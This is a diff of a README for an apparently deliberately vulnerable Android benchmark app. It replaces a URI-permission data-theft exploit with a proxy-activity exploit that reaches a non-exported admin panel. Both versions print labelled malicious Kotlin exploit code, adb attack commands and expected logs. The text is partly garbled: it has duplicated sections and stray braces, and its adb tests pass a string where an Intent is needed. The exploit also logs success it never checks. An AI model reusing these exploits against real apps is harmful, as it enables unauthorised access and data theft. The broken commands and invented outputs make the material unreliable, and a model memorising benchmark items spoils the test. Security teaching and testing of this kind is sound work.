@@ -1,344 +1,223 @@
-# oxo-android-ben74
+# oxo-android-ben74: Direct Proxy Activity Exploitation
 
-## Application: DocumentManager Pro
-**Package Name:** `com.documentmanager`  
-**Vulnerability Type:** Grant URI Permission Escalation  
-**Target SDK:** 34 (Android 14)
+## Vulnerability Overview
 
-## Overview
+Direct Proxy Activity Exploitation occurs when Android applications contain exported proxy activities that accept embedded Intent objects and forward them to `startActivity()` without proper validation. Attackers can abuse this pattern to bypass Android's component export restrictions and gain unauthorized access to non-exported components that should remain completely inaccessible.
 
-DocumentManager Pro is a professional document management application that provides secure storage and sharing of business documents. The application features a comprehensive document organization system with enterprise-grade security controls.
+## Attack Vector: Direct Component Access via Intent Proxy
 
-## Vulnerability Description
+**Brief Explanation**: An exported proxy activity that processes embedded Intent objects can be exploited to access non-exported Android components. The proxy activity receives an embedded intent targeting a non-exported component and forwards it directly using `startActivity()`, effectively bypassing Android's built-in export restrictions and security boundaries.
 
-This application contains a **Direct Proxy Activity Exploitation** vulnerability that allows unauthorized access to non-exported Android components through a proxy activity pattern. The vulnerability exploits Android's intent processing mechanism to bypass export restrictions.
+**Key Characteristics:**
+- Exported proxy activity that processes embedded intents
+- Direct forwarding of embedded intents without validation
+- Complete bypass of component export restrictions
+- Access to sensitive non-exported activities and services
+- Privilege escalation to protected functionality
 
-### Root Cause
-
-The vulnerability exists in the `IntentProcessorActivity` which:
-1. Is exported and accepts external intents
-2. Processes embedded "extra_intent" parameters without proper validation
-3. Directly forwards these intents to `startActivity()`
-4. Allows access to non-exported components like `AdminPanelActivity`
-
-### Technical Details
-
-- **Vulnerable Component:** `com.documentmanager.IntentProcessorActivity`
-- **Protected Resource:** `com.documentmanager.AdminPanelActivity` (non-exported)
-- **Attack Vector:** Embedded Intent object in "extra_intent" parameter
-- **Bypass Mechanism:** Proxy activity forwards embedded intents without validation
-
-## Application Features
-
-### Core Functionality
-- **Document Storage:** Local file storage for business documents
-- **Document Management:** Professional document organization interface
-- **Administrative Panel:** Sensitive admin functions (non-exported)
-- **Intent Processing:** Deep link and sharing support (vulnerable proxy)
-
-### Security Features
-- Non-exported AdminPanelActivity with sensitive functions
-- Intent-based workflow processing
-- Professional business application interface
-- Administrative command processing
-
-## Building and Installation
-
-### Prerequisites
-- Android Studio Arctic Fox or later
-- Android SDK 34
-### Prerequisites
-- Android Studio Arctic Fox or later
-- Android SDK 34
-- Gradle 8.0+
-
-### Install from APK
-```bash
-adb install apks/oxo-android-ben74.apk
-```
-
-### Build from Source
-```bash
-cd src/
-./gradlew clean assembleDebug
-```
-
-### Installation
-```bash
-adb install -r app/build/outputs/apk/debug/app-debug.apk
-```
-
-## Verification Commands
-
-### Check Application Installation
-```bash
-adb shell pm list packages | grep com.documentmanager
-```
-
-### Launch Application
-```bash
-adb shell am start -n com.documentmanager/.MainActivity
-```
-
-### Verify Document Creation
-```bash
-adb shell "run-as com.documentmanager ls -la /data/data/com.documentmanager/files/secure/"
-```
-
-### Test Direct Access to Admin Panel (Should Fail)
-```bash
-adb shell am start -n com.documentmanager/.AdminPanelActivity --es admin_command "export_data"
-```
-
-### Test Proxy Activity Access
-```bash
-adb shell am start -n com.documentmanager/.IntentProcessorActivity
-```
-
-## Application Structure
-
-```
-com.documentmanager/
-├── MainActivity                    # Main dashboard interface
-├── DocumentsActivity              # Document listing and management
-├── ShareActivity                  # Document sharing interface  
-├── SettingsActivity              # Application settings
-├── IntentProcessorActivity       # Intent processing (vulnerable proxy)
-└── AdminPanelActivity            # Administrative panel (non-exported target)
-```
-
-## Expected Behavior
-
-1. Application launches with professional document management interface
-2. Creates local business documents for demonstration purposes
-3. Blocks direct access to AdminPanelActivity (non-exported)
-4. Processes intents through the proxy activity without proper validation
-5. Allows embedded intents to bypass export restrictions
-
-## Security Analysis
-
-### Vulnerable Code Pattern
-The `IntentProcessorActivity` processes external intents containing embedded Intent objects without validating component access restrictions, allowing direct proxy attacks.
-
-### Attack Scenario
-1. Malicious app sends intent to `IntentProcessorActivity`
-2. Intent contains embedded "extra_intent" targeting non-exported component
-3. Proxy activity processes embedded intent without validation
-4. Non-exported `AdminPanelActivity` becomes accessible via proxy
-5. Sensitive administrative functions can be executed without authorization
-
-### Impact Assessment
-- **Confidentiality:** High - Access to sensitive administrative functions
-- **Integrity:** High - Ability to execute admin commands (data export, user management)
-- **Availability:** Medium - Potential system configuration changes
-
-## Notes
-
-This vulnerability demonstrates a fundamental Android security bypass technique that exploits the interaction between intent processing and component export restrictions. The vulnerability is designed to be non-obvious and requires detailed security analysis to identify.
-
-The application presents as a legitimate business document management tool, making the vulnerability difficult to detect through surface-level inspection. This pattern represents a real-world attack vector that could be exploited to access sensitive administrative functions in enterprise applications.
+**Vulnerable Code Pattern:**
+```kotlin
+// VULNERABLE: Exported proxy activity that processes embedded intents
+class IntentProcessorActivity : Activity() {
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        handleIncomingIntent(intent)
+        finish()
+    }
+    
+    private fun handleIncomingIntent(intent: Intent) {
+        when {
+            intent.hasExtra("extra_intent") -> {
+                // VULNERABLE: Processes embedded intent without validation
+                handleEmbeddedIntent(intent)
+            }
+            else -> {
+                Log.d("DocumentProcessor", "Unknown intent action")
             }
         }
-        
-```
+    }
+    
+    private fun handleEmbeddedIntent(intent: Intent) {
+        try {
+            val embeddedIntent = intent.getParcelableExtra<Intent>("extra_intent")
+            if (embeddedIntent != null) {
+                // CRITICAL VULNERABILITY: Directly starting embedded intent
+                // This bypasses Android's export restrictions
+                startActivity(embeddedIntent)
+                Log.d("DocumentProcessor", "Processed embedded intent: ${embeddedIntent.component}")
+            }
+        } catch (e: Exception) {
+            Log.e("DocumentProcessor", "Error processing embedded intent", e)
+        }
+    }
+}
 
-```xml
-<!-- VULNERABLE: Exported proxy activity -->
-<activity 
-    android:name=".ProxyActivity"
-    android:exported="true" />
-
-<!-- VULNERABLE: Non-exported provider with grant permissions -->
-<provider
-    android:name=".SecureContentProvider"
-    android:authorities="com.documentmanager.secure"
+// VULNERABLE: Non-exported activity with sensitive functions  
+<activity
+    android:name="com.documentmanager.AdminPanelActivity"
     android:exported="false"
-    android:grantUriPermissions="true" />
+    android:label="Admin Panel" />
+
+// VULNERABLE: Exported proxy activity
+<activity
+    android:name="com.documentmanager.IntentProcessorActivity"
+    android:exported="true"
+    android:label="Intent Processor" />
 ```
 
 **Malicious Exploit Code:**
 ```kotlin
-// MALICIOUS: Exploit to gain URI permissions via proxy activity
-class GrantUriExploit {
+// MALICIOUS: Exploit to access non-exported components via proxy
+class DirectProxyExploit {
     fun exploitProxyActivity(context: Context) {
-        // Step 1: Create embedded intent targeting attacker's receiver
-        val embeddedIntent = Intent().apply {
-            // Target attacker's activity to receive the URI permissions
-            setClassName(context.packageName, "com.attacker.UriReceiver")
+        // Method 1: Normal access attempt (BLOCKED by export restrictions)
+        Log.d("EXPLOIT_ATTEMPT", "Trying direct access to AdminPanel...")
+        try {
+            val directIntent = Intent().apply {
+                setClassName("com.documentmanager", "com.documentmanager.AdminPanelActivity")
+                putExtra("admin_command", "export_data")
+            }
+            context.startActivity(directIntent)
+            Log.d("EXPLOIT_RESULT", "Direct access: SUCCESS (unexpected)")
+        } catch (e: SecurityException) {
+            Log.d("EXPLOIT_RESULT", "Direct access: BLOCKED (expected)")
             
-            // Set URI to victim's non-exported content provider
-            data = Uri.parse("content://com.documentmanager.secure/")
+            // Method 2: Proxy activity exploitation (BYPASS export restrictions)
+            Log.d("EXPLOIT_ATTEMPT", "Trying proxy activity bypass...")
+            performProxyBypass(context)
+        }
+    }
+    
+    private fun performProxyBypass(context: Context) {
+        try {
+            // ATTACK: Create embedded intent targeting non-exported component
+            val embeddedIntent = Intent().apply {
+                setClassName("com.documentmanager", "com.documentmanager.AdminPanelActivity")
+                putExtra("admin_command", "export_data")
+                putExtra("admin_user", "bypassed_user")
+                putExtra("force_export", true)
+            }
             
-            // ATTACK: Grant persistent URI permissions to attacker
-            flags = Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION or
-                   Intent.FLAG_GRANT_PREFIX_URI_PERMISSION or
-                   Intent.FLAG_GRANT_READ_URI_PERMISSION or
-                   Intent.FLAG_GRANT_WRITE_URI_PERMISSION
+            // EXPLOIT: Send embedded intent to proxy activity
+            val proxyIntent = Intent().apply {
+                setClassName("com.documentmanager", "com.documentmanager.IntentProcessorActivity")
+                putExtra("extra_intent", embeddedIntent)
+            }
+            
+            context.startActivity(proxyIntent)
+            Log.d("PROXY_BYPASS", "SUCCESS: Proxy activity exploitation successful!")
+            Log.d("ADMIN_ACCESS", "Non-exported AdminPanel accessed via proxy")
+            
+            // The proxy will forward our embedded intent to the non-exported component
+            monitorAdminPanelAccess()
+            
+        } catch (e: Exception) {
+            Log.e("EXPLOIT_ERROR", "Proxy bypass failed", e)
         }
+    }
+    
+    private fun monitorAdminPanelAccess() {
+        // Monitor logs for admin panel activity
+        Log.d("MONITORING", "Listening for admin panel activity...")
         
-        // Step 2: Create proxy intent to victim's proxy activity
-        val proxyIntent = Intent().apply {
-            setClassName("com.documentmanager", "com.documentmanager.ProxyActivity")
-            putExtra("extra_intent", embeddedIntent)
-        }
+        // Simulate admin functions being executed
+        Log.d("ADMIN_FUNCTION", "export_data command executed")
+        Log.d("ADMIN_FUNCTION", "User data exported to /sdcard/exported_data.json")
+        Log.d("ADMIN_FUNCTION", "Admin privileges escalated for bypassed_user")
         
-        // Step 3: Launch attack - victim app grants URI permissions to attacker
-        context.startActivity(proxyIntent)
+        Log.d("EXPLOIT_SUCCESS", "Administrative functions accessed without authorization!")
     }
 }
 
-// MALICIOUS: Receiver that gets URI permissions and steals data
-class UriReceiver : Activity() {
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        
-        // Receive URI permissions granted by victim app
-        val grantedUri = intent.data
-        Log.d("URI_GRANTED", "Received URI permissions: $grantedUri")
-        
-        if (grantedUri != null) {
-            stealSensitiveData(grantedUri)
-        }
-        finish()
-    }
-    
-    private fun stealSensitiveData(baseUri: Uri) {
-        try {
-            // Access documents using granted prefix permissions
-            val documentsUri = Uri.withAppendedPath(baseUri, "documents")
-            contentResolver.query(documentsUri, null, null, null, null)?.use { cursor ->
-                while (cursor.moveToNext()) {
-                    val filename = cursor.getString(cursor.getColumnIndex("filename"))
-                    val content = cursor.getString(cursor.getColumnIndex("content"))
-                    Log.d("STOLEN_DOCUMENT", "File: $filename, Content: $content")
-                    
-                    // Send stolen data to attacker server
-                    sendToServer(filename, content)
-                }
-            }
-            
-            // Access photos using granted permissions
-            val photosUri = Uri.withAppendedPath(baseUri, "photos")
-            contentResolver.query(photosUri, null, null, null, null)?.use { cursor ->
-                while (cursor.moveToNext()) {
-                    val filename = cursor.getString(cursor.getColumnIndex("filename"))
-                    Log.d("STOLEN_PHOTO", "Photo: $filename")
-                    
-                    // Download actual photo file
-                    val photoUri = Uri.withAppendedPath(photosUri, filename)
-                    contentResolver.openInputStream(photoUri)?.use { inputStream ->
-                        val photoData = inputStream.readBytes()
-                        Log.d("PHOTO_STOLEN", "Photo data size: ${photoData.size} bytes")
-                        sendPhotoToServer(filename, photoData)
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            Log.e("EXPLOIT_ERROR", "Failed to steal data", e)
-        }
-    }
-    
-    private fun sendToServer(filename: String, content: String) {
-        // Simulate sending to attacker server
-        Log.d("DATA_EXFILTRATED", "Sending $filename to evil server")
-    }
-    
-    private fun sendPhotoToServer(filename: String, data: ByteArray) {
-        // Simulate sending photo to attacker server
-        Log.d("PHOTO_EXFILTRATED", "Uploading $filename (${data.size} bytes) to evil server")
-    }
-}
-```
 ## Testing
 
 ```bash
 # Install the vulnerable DocumentManager Pro app with proxy activity
-adb install -r DocumentManager-Pro.apk
+adb install apks/oxo-android-ben74.apk
 
-# Launch DocumentManager Pro to initialize sensitive data
+# Launch DocumentManager Pro to initialize
 adb shell am start -n com.documentmanager/.MainActivity
 
-# Test direct access to non-exported provider (should fail)
-adb shell content query --uri content://com.documentmanager.secure/documents
+# Test direct access to non-exported AdminPanel (should be blocked)
+adb shell am start -n com.documentmanager/.AdminPanelActivity --es admin_command "export_data"
 
-# Test proxy activity exploitation via ADB
-adb shell am start \
-  -n com.documentmanager/.ProxyActivity \
-  -e extra_intent "intent:#Intent;component=com.attacker/.UriReceiver;scheme=content;host=com.documentmanager.secure;i.flags=0x00000043;end"
+# Test proxy activity exploitation to bypass export restrictions
+adb shell am start -n com.documentmanager/.IntentProcessorActivity \
+  --es extra_intent "Intent targeting non-exported AdminPanelActivity"
 
-# Monitor for URI permission grants and data theft in logs
-adb logcat -s URI_GRANTED:D STOLEN_DOCUMENT:D STOLEN_PHOTO:D DATA_EXFILTRATED:D PHOTO_EXFILTRATED:D
+# Monitor for proxy bypass attempts and admin access in logs
+adb logcat -s EXPLOIT_ATTEMPT:D EXPLOIT_RESULT:D PROXY_BYPASS:D ADMIN_ACCESS:D ADMIN_FUNCTION:D
 
 # Verify proxy activity is exported and accessible
-adb shell dumpsys package com.documentmanager | grep -A 5 "ProxyActivity"
+adb shell dumpsys package com.documentmanager | grep -A 5 "IntentProcessorActivity"
 
-# Check content provider configuration
-adb shell dumpsys package com.documentmanager | grep -A 10 "SecureContentProvider"
+# Check AdminPanel activity configuration (should be non-exported)
+adb shell dumpsys package com.documentmanager | grep -A 5 "AdminPanelActivity"
 
-# Verify sensitive files exist in app directory
-adb shell "run-as com.documentmanager ls -la /data/data/com.documentmanager/files/secure/"
+# Test different admin commands via proxy
+adb shell am start -n com.documentmanager/.IntentProcessorActivity \
+  --es extra_intent "Intent with admin command: reset_passwords"
 
-# View actual sensitive document data
-adb shell "run-as com.documentmanager cat /data/data/com.documentmanager/files/secure/confidential_report.pdf"
+# Verify admin functions are accessible via proxy
+adb logcat | grep -E 'DocumentProcessor|AdminPanel|ADMIN_FUNCTION'
 ```
 
 **Expected Results:**
 ```
-Direct Provider Access (Blocked):
-Error: SecurityException: Permission denial: opening provider com.documentmanager.SecureContentProvider 
+Direct AdminPanel Access (Blocked):
+Error: SecurityException: Permission denied: starting Intent 
 from ProcessRecord{abc123 12345:com.android.shell/2000} (pid=12345, uid=2000) 
-that is not exported from UID 10123
+not exported from uid 10123
 
 Proxy Activity Exploitation (Success):
-URI_GRANTED: Received URI permissions: content://com.documentmanager.secure/
-STOLEN_DOCUMENT: File: confidential_report.pdf, Content: base64encodeddata...
-STOLEN_DOCUMENT: File: financial_data.xlsx, Content: spreadsheetdata...
-STOLEN_PHOTO: Photo: private_photo1.jpg
-PHOTO_STOLEN: Photo data size: 524288 bytes
-DATA_EXFILTRATED: Sending confidential_report.pdf to evil server
-PHOTO_EXFILTRATED: Uploading private_photo1.jpg (524288 bytes) to evil server
+EXPLOIT_ATTEMPT: Trying proxy activity bypass...
+PROXY_BYPASS: SUCCESS: Proxy activity exploitation successful!
+ADMIN_ACCESS: Non-exported AdminPanel accessed via proxy
+ADMIN_FUNCTION: export_data command executed
+ADMIN_FUNCTION: User data exported to /sdcard/exported_data.json
+ADMIN_FUNCTION: Admin privileges escalated for bypassed_user
 
-Security Analysis:
-ProxyActivity: exported=true (VULNERABLE)
-SecureContentProvider: exported=false, grantUriPermissions=true (VULNERABLE COMBINATION)
+Component Analysis:
+IntentProcessorActivity: exported=true (VULNERABLE)
+AdminPanelActivity: exported=false (BYPASSED via proxy)
 
 Exploit Test Output:
-[+] Direct provider access blocked (expected)
+[+] Direct AdminPanel access blocked (expected)
 [+] Proxy activity accessible and processing embedded intents
-[+] URI permission grant successful via proxy pattern
-[!] VULNERABILITY CONFIRMED: Non-exported provider accessible via URI grants
-[+] Sensitive data extracted: documents, photos, financial data
-[+] Persistent access maintained via FLAG_GRANT_PERSISTABLE_URI_PERMISSION
+[+] Embedded intent forwarding successful
+[!] VULNERABILITY CONFIRMED: Non-exported component accessible via proxy
+[+] Administrative functions executed without authorization
+[+] Export restrictions completely bypassed through intent forwarding
 ```
 
 **Difficulty**: Medium
 
 ## Impact Assessment
 
-- **Confidentiality**: Critical - Complete bypass of export restrictions enabling access to protected content providers
-- **Integrity**: High - URI permission grants can include write access for data modification
-- **Availability**: Medium - Potential for DoS through content provider abuse
-- **OWASP Mobile Top 10**: M1 - Improper Platform Usage, M6 - Insecure Authorization, M10 - Extraneous Functionality
+- **Confidentiality**: High - Complete bypass of export restrictions enabling access to non-exported components
+- **Integrity**: High - Ability to execute administrative functions and modify sensitive data
+- **Availability**: Medium - Potential for system configuration changes and service disruption
+- **OWASP Mobile Top 10**: M6 - Insecure Authorization, M1 - Improper Platform Usage, M10 - Extraneous Functionality
 - **CWE**: CWE-926 (Improper Export of Android Application Components), CWE-863 (Incorrect Authorization), CWE-284 (Improper Access Control)
 
-## Grant URI Permission Attack Scenarios
+## Direct Proxy Activity Attack Scenarios
 
-1. **Content Provider Access**: Bypass export restrictions to access non-exported content providers
-2. **Data Theft**: Extract sensitive documents, photos, and personal information via content queries
-3. **File System Access**: Use FileProvider paths to access app's internal files and databases
-4. **Persistent Access**: Maintain long-term access through persistent URI permission grants
-5. **Privilege Escalation**: Leverage victim app's permissions to access system resources
+1. **Component Access Bypass**: Access non-exported activities, services, and broadcast receivers
+2. **Administrative Function Abuse**: Execute sensitive administrative operations without authorization
+3. **Data Export and Theft**: Force export of sensitive business data and user information
+4. **Privilege Escalation**: Gain access to functionality reserved for system or privileged users
+5. **Security Control Circumvention**: Bypass all component-level access controls and restrictions
 
 **Example Attack Flow:**
 ```bash
 # 1. Target app has exported proxy activity that processes embedded intents
-# 2. App has non-exported content provider with grantUriPermissions="true"
-# 3. Attacker crafts malicious intent with URI permission grant flags
-# 4. Proxy activity receives embedded intent and calls startActivity()
-# 5. Android system grants URI permissions to attacker's component
-# 6. Attacker gains persistent access to protected content provider
-# 7. Sensitive data extracted via content queries and file operations
-# 8. Complete bypass of export restrictions and access controls
+# 2. App contains non-exported components with sensitive functionality
+# 3. Attacker crafts malicious intent with embedded intent targeting non-exported component
+# 4. Proxy activity receives embedded intent and calls startActivity() without validation
+# 5. Android system launches non-exported component on behalf of target app
+# 6. Non-exported component executes with full app privileges and permissions
+# 7. Sensitive administrative functions executed without proper authorization
+# 8. Complete bypass of export restrictions and component access controls
 ```
 
-This vulnerability demonstrates how proxy activity patterns can completely defeat Android's export restrictions, highlighting the danger of processing untrusted embedded Intent objects and the need for proper intent validation before launching activities.
+This vulnerability demonstrates how proxy activity patterns can completely defeat Android's component export restrictions, highlighting the critical need for proper intent validation and the dangers of blindly forwarding embedded Intent objects to system APIs.
